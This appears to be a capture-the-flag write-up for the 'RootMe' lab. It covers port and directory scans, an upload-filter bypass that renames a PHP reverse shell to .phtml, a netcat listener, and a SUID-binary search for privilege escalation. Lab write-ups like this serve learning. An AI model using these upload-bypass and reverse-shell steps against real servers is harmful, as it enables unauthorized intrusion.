# RootMe

IP - 10.10.88.7

## Scanning and Enumeration
nmap scan:
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
```
dirsearch:
```
[22:18:58] 403 -   275B - /.php
[22:19:21] 301 -   306B - /css  ->  http://10.10.88.7/css/
[22:19:28] 200 -   616B - /index.php
[22:19:28] 200 -   616B - /index.php/login/
[22:19:30] 200 -   956B - /js/
[22:19:30] 301 -   305B - /js  ->  http://10.10.88.7/js/
[22:19:38] 301 -   308B - /panel  ->  http://10.10.88.7/panel/
[22:19:38] 200 -   732B - /panel/
[22:19:44] 403 -   275B - /server-status
[22:19:44] 403 -   275B - /server-status/
[22:19:50] 301 -   310B - /uploads  ->  http://10.10.88.7/uploads/
[22:19:50] 200 -   741B - /uploads/
```

## Exploit
- http://10.10.88.7/panel is vulnerable to file upload.
- http://10.10.88.7/uploads allows you to see the uploaded files.
- Tested website uploads and found out it allows .txt to be uploaded but .php gets denied.


## Reverse Shell
- In terminal navigate to ``` /usr/share/webshells/php/php-reverse-shell.php ```
- ``` cp php-reverse-shell.php ~/Documents/php_reverse_shell.phtml ``` (copy executable file to "Docuemnts" directory and change the file name to .phtml file).


*The reason behind changing the file name to .phtml it's because we need to use a different php extension in order to execute the php reverse shell.
- Upload the executable file in the website and then go to http://10.10.88.7/uploads.
- In the terminal start netcat listener - ``` nc -nlvp 4444 ``` > go back to the website and open the executable file > acheived reverese shell.

## Post-Exploit
- To find user.txt - ``` find / -name “user.txt” 2>/dev/null ```

# Priviledge Escalation
https://hacking-capture.github.io/root-me/
Finding user with different priviledges -``` find / -user root -perm -4000 2>/dev/null ```
